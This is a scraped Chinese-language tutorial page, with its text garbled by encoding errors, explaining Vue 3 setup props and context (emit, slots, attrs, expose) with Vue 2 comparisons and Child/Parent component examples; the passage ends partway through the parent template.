                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€propsï¼šå’Œ Vue2 æ ¸å¿ƒé€»è¾‘å®Œå…¨ä¸€è‡´ï¼Œä»…è®¿é—®æ–¹å¼å¾®è°ƒ</h3>
<p><code>props</code>Â ä½œä¸º Vue ã€Œçˆ¶ä¼ å­ã€çš„æ ¸å¿ƒé€šä¿¡æ–¹å¼</p>
<p>Vue3 ä¸­ <strong>å•å‘æ•°æ®æµã€ç±»å‹æ ¡éªŒã€é»˜è®¤å€¼ / å¿…ä¼ é¡¹</strong> ç­‰æ ¸å¿ƒè§„åˆ™å’Œ Vue2 å®Œå…¨ä¸€æ ·ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯ã€Œè®¿é—®æ–¹å¼ã€ï¼š</p>
<h4 data-id="heading-1">1. å…±æ€§ï¼ˆVue2/Vue3 é€šç”¨ï¼‰</h4>
<ul>
<li>å•å‘æ•°æ®æµï¼šå­ç»„ä»¶ä¸èƒ½ç›´æ¥ä¿®æ”¹ propsï¼Œå¿…é¡»é€šè¿‡Â <code>emit</code>Â é€šçŸ¥çˆ¶ç»„ä»¶ä¿®æ”¹ï¼›</li>
<li>æ”¯æŒç±»å‹æ ¡éªŒï¼ˆ String / Number / Array / Object ç­‰ï¼‰ã€é»˜è®¤å€¼ã€è‡ªå®šä¹‰æ ¡éªŒè§„åˆ™ï¼›</li>
<li>çˆ¶ç»„ä»¶ä¼ çš„å±æ€§å¦‚æœæ²¡è¢« props å£°æ˜ï¼Œä¼šè½åˆ°Â <code>attrs</code>Â ä¸­ï¼ˆä¸‹æ–‡ä¼šæï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-2">2. ç”¨æ³•å¯¹æ¯”ï¼ˆVue2 é€‰é¡¹å¼ vs Vue3 ç»„åˆå¼ï¼‰</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Vue2 é€‰é¡¹å¼ API --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">props</span>: {
    <span class="hljs-attr">name</span>: { <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">default</span>: <span class="hljs-string">'é»˜è®¤å'</span> },
    <span class="hljs-attr">age</span>: { <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> }
  },
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// ğŸ‘‰ é€šè¿‡ this è®¿é—®</span>
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Vue3 ç»„åˆå¼ APIï¼ˆsetupï¼‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// ğŸ‘‰ props å®šä¹‰è§„åˆ™å’Œ Vue2 å®Œå…¨ä¸€æ ·</span>
  <span class="hljs-attr">props</span>: {
    <span class="hljs-attr">name</span>: { <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">default</span>: <span class="hljs-string">'é»˜è®¤å'</span> },
    <span class="hljs-attr">age</span>: { <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> }
  },
  <span class="hljs-comment">// ğŸ‘‰ props ä½œä¸º setup ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥ï¼Œæ— éœ€ this</span>
  <span class="hljs-title function_">setup</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(props.<span class="hljs-property">name</span>); <span class="hljs-comment">// ç›´æ¥è®¿é—®</span>
    <span class="hljs-comment">// æ³¨æ„ï¼šprops æ˜¯å“åº”å¼çš„ï¼Œè§£æ„ä¼šä¸¢å¤±å“åº”å¼ï¼Œéœ€ç”¨ toRefs</span>
    <span class="hljs-keyword">const</span> { name } = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">toRefs</span>(props);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name.<span class="hljs-property">value</span>); <span class="hljs-comment">// ref éœ€ .value è®¿é—®</span>
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">äºŒã€contextï¼šVue3 æŠŠ Vue2 çš„ã€Œthis ä¸Šçš„é€šä¿¡å±æ€§ã€èšåˆåˆ°ä¸Šä¸‹æ–‡</h3>
<p><code>context</code>Â æ˜¯Â <code>setup</code>Â çš„ç¬¬äºŒä¸ªå‚æ•°ï¼ˆéå“åº”å¼ï¼Œå¯ç›´æ¥è§£æ„ï¼‰ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯æ›¿ä»£ Vue2 ä¸­Â <code>this</code>Â ä¸Šçš„ã€Œé props ç›¸å…³é€šä¿¡èƒ½åŠ›ã€ï¼Œä½ æåˆ°çš„å‡ ä¸ªå±æ€§å¯¹åº”å…³ç³»ç²¾å‡†ï¼Œè¡¥å……ç”¨æ³•ç»†èŠ‚ï¼š</p>






























<table><thead><tr><th>context å±æ€§</th><th>Vue2 å¯¹åº”å†™æ³•</th><th>æ ¸å¿ƒç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>context.emit</td><td>this.$emit</td><td>å­ä¼ çˆ¶è§¦å‘äº‹ä»¶ï¼š<code>context.emit('change', { id: 1 })</code>ï¼ˆçˆ¶ç»„ä»¶ç”¨Â <code>@change</code>Â æ¥æ”¶ï¼‰</td></tr><tr><td>context.slots</td><td>this.$slots</td><td>è®¿é—®çˆ¶ç»„ä»¶ä¼ å…¥çš„æ’æ§½ï¼š<code>context.slots.header()</code>ï¼ˆVue3 æ’æ§½æ˜¯å‡½æ•°ï¼Œéœ€åŠ  () è°ƒç”¨ï¼‰</td></tr><tr><td>context.attrs</td><td>this.$attrs</td><td>æ¥æ”¶çˆ¶ç»„ä»¶æœªè¢« props å£°æ˜çš„å±æ€§ï¼šçˆ¶ä¼ Â <code>class="box"</code>Â ä¸” props æœªå£°æ˜ â†’Â <code>context.attrs.class</code></td></tr><tr><td>context.expose()</td><td>æ— ï¼ˆVue2 æ— æ­¤èƒ½åŠ›ï¼‰</td><td>ä¸»åŠ¨æš´éœ²å­ç»„ä»¶å†…éƒ¨å±æ€§ç»™çˆ¶ç»„ä»¶ï¼š<code>context.expose({ fn: () =&gt; console.log('æš´éœ²çš„æ–¹æ³•') })</code></td></tr></tbody></table>
<h4 data-id="heading-4">æ ¸å¿ƒç¤ºä¾‹ï¼ˆcontext è§£æ„ä½¿ç”¨ï¼Œæ›´ç®€æ´ï¼‰</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params">props, { emit, slots, attrs, expose }</span>) {
    <span class="hljs-comment">// 1. å­ä¼ çˆ¶ï¼šè§¦å‘è‡ªå®šä¹‰äº‹ä»¶</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">emit</span>(<span class="hljs-string">'submit'</span>, <span class="hljs-string">'å­ç»„ä»¶æ•°æ®'</span>);

    <span class="hljs-comment">// 2. è®¿é—®å…·åæ’æ§½</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(slots.<span class="hljs-title function_">footer</span>()); <span class="hljs-comment">// è·å–çˆ¶ç»„ä»¶ä¼ å…¥çš„ footer æ’æ§½å†…å®¹</span>

    <span class="hljs-comment">// 3. è®¿é—®æœªå£°æ˜çš„å±æ€§</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(attrs[<span class="hljs-string">'data-id'</span>]); <span class="hljs-comment">// çˆ¶ä¼  data-id="123" ä¸”æœªè¢« props å£°æ˜</span>

    <span class="hljs-comment">// 4. æš´éœ²å†…éƒ¨æ–¹æ³•ç»™çˆ¶ç»„ä»¶ï¼ˆçˆ¶é€šè¿‡ ref ä»…èƒ½è®¿é—®æš´éœ²çš„å†…å®¹ï¼‰</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">internalFn</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-string">'å†…éƒ¨é€»è¾‘'</span>;
    <span class="hljs-title function_">expose</span>({ internalFn }); <span class="hljs-comment">// çˆ¶ç»„ä»¶ ref.value.internalFn() å¯è°ƒç”¨</span>

    <span class="hljs-keyword">return</span> { handleClick };
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-5">1. å­ç»„ä»¶ï¼ˆChild.vueï¼‰ï¼šæ ¸å¿ƒé€»è¾‘è¯¦è§£</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- ç‚¹å‡»æŒ‰é’®è§¦å‘å­ä¼ çˆ¶äº‹ä»¶ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleClick"</span>&gt;</span>ç‚¹å‡»è§¦å‘submitäº‹ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- æ¸²æŸ“çˆ¶ç»„ä»¶ä¼ å…¥çš„footerå…·åæ’æ§½ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"slot-container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"footer"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- æŠŠattrsä¸­çš„data-idé€ä¼ ç»™å†…éƒ¨divï¼ˆæ¼”ç¤ºattrsç”¨æ³•ï¼‰ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:data-id</span>=<span class="hljs-string">"attrs['data-id']"</span>&gt;</span>é€ä¼ çˆ¶ç»„ä»¶æœªå£°æ˜çš„data-idå±æ€§<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// å¯¼å…¥vueçš„æ ¸å¿ƒæ–¹æ³•ï¼ˆæŒ‰éœ€å¯¼å…¥ï¼ŒVue3ç»„åˆå¼APIè§„èŒƒï¼‰</span>
<span class="hljs-keyword">import</span> { toRefs } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šå£°æ˜propsï¼ˆä»…å£°æ˜nameï¼Œæœªå£°æ˜data-idï¼Œæ‰€ä»¥data-idä¼šè½åˆ°attrsä¸­ï¼‰</span>
  <span class="hljs-attr">props</span>: {
    <span class="hljs-attr">name</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
      <span class="hljs-attr">default</span>: <span class="hljs-string">'é»˜è®¤åç§°'</span>
    }
  },

  <span class="hljs-comment">// setupç¬¬äºŒä¸ªå‚æ•°è§£æ„å‡ºï¼šemitï¼ˆå­ä¼ çˆ¶ï¼‰ã€slotsï¼ˆæ’æ§½ï¼‰ã€attrsï¼ˆé€ä¼ å±æ€§ï¼‰ã€exposeï¼ˆæš´éœ²å†…å®¹ï¼‰</span>
  <span class="hljs-title function_">setup</span>(<span class="hljs-params">props, { emit, slots, attrs, expose }</span>) {
    <span class="hljs-comment">// ğŸ‘‰ 1. å­ä¼ çˆ¶ï¼šè§¦å‘è‡ªå®šä¹‰äº‹ä»¶ï¼ˆæ ¸å¿ƒç”¨æ³•ï¼‰</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-comment">// ç¬¬ä¸€ä¸ªå‚æ•°ï¼šäº‹ä»¶åï¼ˆçˆ¶ç»„ä»¶ç”¨@submitæ¥æ”¶ï¼‰ï¼›ç¬¬äºŒä¸ªå‚æ•°ï¼šä¼ é€’ç»™çˆ¶ç»„ä»¶çš„æ•°æ®</span>
      <span class="hljs-title function_">emit</span>(<span class="hljs-string">'submit'</span>, {
        <span class="hljs-attr">msg</span>: <span class="hljs-string">'å­ç»„ä»¶ä¼ é€’çš„æ•°æ®'</span>,
        <span class="hljs-attr">name</span>: props.<span class="hljs-property">name</span> <span class="hljs-comment">// ç»“åˆpropsä½¿ç”¨ï¼ŒæŠŠpropsæ•°æ®ä¹Ÿä¼ ç»™çˆ¶ç»„ä»¶</span>
      });
    };

    <span class="hljs-comment">// ğŸ‘‰ 2. è®¿é—®å…·åæ’æ§½ï¼ˆæ§åˆ¶å°æ‰“å°æ’æ§½å†…å®¹ï¼ŒéªŒè¯æ˜¯å¦ä¼ å…¥ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== è®¿é—®footeræ’æ§½ ====='</span>);
    <span class="hljs-comment">// Vue3ä¸­slotsçš„æ¯ä¸ªæ’æ§½éƒ½æ˜¯å‡½æ•°ï¼Œè°ƒç”¨åè¿”å›VNodeæ•°ç»„ï¼ˆæ’æ§½çš„DOMç»“æ„ï¼‰</span>
    <span class="hljs-keyword">if</span> (slots.<span class="hljs-property">footer</span>) { <span class="hljs-comment">// å…ˆåˆ¤æ–­çˆ¶ç»„ä»¶æ˜¯å¦ä¼ å…¥äº†footeræ’æ§½ï¼Œé¿å…æŠ¥é”™</span>
      <span class="hljs-keyword">const</span> footerSlotContent = slots.<span class="hljs-title function_">footer</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'footeræ’æ§½çš„VNodeå†…å®¹ï¼š'</span>, footerSlotContent);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çˆ¶ç»„ä»¶æœªä¼ å…¥footeræ’æ§½'</span>);
    }

    <span class="hljs-comment">// ğŸ‘‰ 3. è®¿é—®çˆ¶ç»„ä»¶æœªè¢«propså£°æ˜çš„å±æ€§ï¼ˆattrsï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== è®¿é—®attrs ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çˆ¶ç»„ä»¶ä¼ å…¥çš„data-idï¼š'</span>, attrs[<span class="hljs-string">'data-id'</span>]); <span class="hljs-comment">// çˆ¶ä¼ çš„data-idæœªè¢«propså£°æ˜ï¼Œæ‰€ä»¥åœ¨attrsä¸­</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çˆ¶ç»„ä»¶ä¼ å…¥çš„classï¼ˆè‹¥æœ‰ï¼‰ï¼š'</span>, attrs.<span class="hljs-property">class</span>); <span class="hljs-comment">// class/styleä¼šè‡ªåŠ¨é€ä¼ ï¼Œä¹Ÿä¼šåœ¨attrsä¸­</span>
    <span class="hljs-comment">// æ³¨æ„ï¼šattrsæ˜¯éå“åº”å¼çš„ï¼Œè‹¥éœ€è¦å“åº”å¼ï¼Œå¯ç»“åˆtoRefsï¼ˆä½†ä¸€èˆ¬attrsæ— éœ€å“åº”å¼ï¼‰</span>

    <span class="hljs-comment">// ğŸ‘‰ 4. æš´éœ²å­ç»„ä»¶å†…éƒ¨æ–¹æ³•/å±æ€§ç»™çˆ¶ç»„ä»¶ï¼ˆçˆ¶ç»„ä»¶é€šè¿‡refè®¿é—®ï¼‰</span>
    <span class="hljs-comment">// å®šä¹‰å­ç»„ä»¶å†…éƒ¨æ–¹æ³•ï¼ˆæœªreturnä¹Ÿèƒ½é€šè¿‡exposeæš´éœ²ï¼‰</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">internalFn</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">return</span> <span class="hljs-string">`å†…éƒ¨æ–¹æ³•æ‰§è¡ŒæˆåŠŸï¼props.nameçš„å€¼æ˜¯ï¼š<span class="hljs-subst">${props.name}</span>`</span>;
    };
    <span class="hljs-comment">// å®šä¹‰å†…éƒ¨å±æ€§ï¼ˆä»…æš´éœ²ç»™çˆ¶ç»„ä»¶ï¼Œæ¨¡æ¿ä¸­æ— æ³•ç›´æ¥ä½¿ç”¨ï¼Œé™¤éreturnï¼‰</span>
    <span class="hljs-keyword">const</span> internalData = <span class="hljs-string">'å­ç»„ä»¶å†…éƒ¨ç§æœ‰æ•°æ®'</span>;

    <span class="hljs-comment">// ä¸»åŠ¨æš´éœ²æŒ‡å®šå†…å®¹ï¼ˆåªæœ‰è¿™é‡Œå£°æ˜çš„ï¼Œçˆ¶ç»„ä»¶æ‰èƒ½é€šè¿‡refè®¿é—®ï¼‰</span>
    <span class="hljs-title function_">expose</span>({
      internalFn, <span class="hljs-comment">// æš´éœ²å†…éƒ¨æ–¹æ³•</span>
      internalData, <span class="hljs-comment">// æš´éœ²å†…éƒ¨å±æ€§</span>
      <span class="hljs-comment">// ä¹Ÿå¯ä»¥æš´éœ²propsï¼ˆæ–¹ä¾¿çˆ¶ç»„ä»¶ç›´æ¥è·å–propså€¼ï¼‰</span>
      <span class="hljs-attr">getPropsName</span>: <span class="hljs-function">() =&gt;</span> props.<span class="hljs-property">name</span>
    });

    <span class="hljs-comment">// ğŸ‘‰ 5. è¡¥å……ï¼špropsçš„å“åº”å¼ä½¿ç”¨ï¼ˆå¯é€‰ï¼‰</span>
    <span class="hljs-comment">// è§£æ„propså¹¶ä¿ç•™å“åº”å¼ï¼ˆè‹¥éœ€è¦å•ç‹¬ä½¿ç”¨propsä¸­çš„å±æ€§ï¼‰</span>
    <span class="hljs-keyword">const</span> { name } = <span class="hljs-title function_">toRefs</span>(props);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== propsä½¿ç”¨ ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'props.nameçš„å€¼ï¼ˆå“åº”å¼ï¼‰ï¼š'</span>, name.<span class="hljs-property">value</span>);

    <span class="hljs-comment">// æŠŠéœ€è¦åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨çš„æ–¹æ³•returnå‡ºå»ï¼ˆhandleClickåœ¨æ¨¡æ¿ä¸­ç»‘å®šç‚¹å‡»äº‹ä»¶ï¼Œå¿…é¡»returnï¼‰</span>
    <span class="hljs-keyword">return</span> {
      handleClick,
      attrs <span class="hljs-comment">// æŠŠattrsreturnå‡ºå»ï¼Œæ–¹ä¾¿æ¨¡æ¿ä¸­ä½¿ç”¨ï¼ˆå¦‚ä¸Šé¢æ¨¡æ¿ä¸­çš„:data-id="attrs['data-id']"ï¼‰</span>
    };
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">2. çˆ¶ç»„ä»¶ï¼ˆParent.vueï¼‰ï¼šè°ƒç”¨å­ç»„ä»¶å¹¶é…åˆä½¿ç”¨</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent-container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>çˆ¶ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- ç¬¬äºŒæ­¥ï¼šä½¿ç”¨å­ç»„ä»¶ï¼Œå®Œæˆä»¥ä¸‹æ“ä½œï¼š
         1. ä¼ propsï¼šname="æµ‹è¯•åç§°"
         2. ä¼ æœªå£°æ˜çš„å±æ€§ï¼šdata-id="10086"ï¼ˆä¼šè½åˆ°å­ç»„ä»¶attrsä¸­ï¼‰
         3. ç»‘å®šå­ç»„ä»¶çš„è‡ªå®šä¹‰äº‹ä»¶ï¼š@submit="handleChildSubmit"
         4. ä¼ å…¥å…·åæ’æ§½ï¼š&lt;template #footer&gt;...&lt;/template&gt;
         5. ç»™å­ç»„ä»¶åŠ refï¼šchildRefï¼ˆç”¨äºè®¿é—®å­ç»„ä»¶æš´éœ²çš„å†…å®¹ï¼‰
    --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Child</span>
      <span class="hljs-attr">ref</span>=<span class="hljs-string">"childRef"</span>
      <span class="hljs-attr">name</span>=<span class="hljs-string">"æµ‹è¯•åç§°"</span>
      <span class="hljs-attr">data-id</span>=<span class="hljs-string">"10086"</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"child-component"</span>
      @<span class="hljs-attr">submit</span>=<span class="hljs-string">"handleChildSubmit"</span>
    &gt;</span>
      <span class="hljs-comment">&lt;!-- ä¼ å…¥footerå…·åæ’æ§½ï¼ˆå­ç»„ä»¶ä¼šè®¿é—®è¿™ä¸ªæ’æ§½ï¼‰ --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">footer</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¿™æ˜¯çˆ¶ç»„ä»¶ä¼ ç»™å­ç»„ä»¶çš„footeræ’æ§½å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
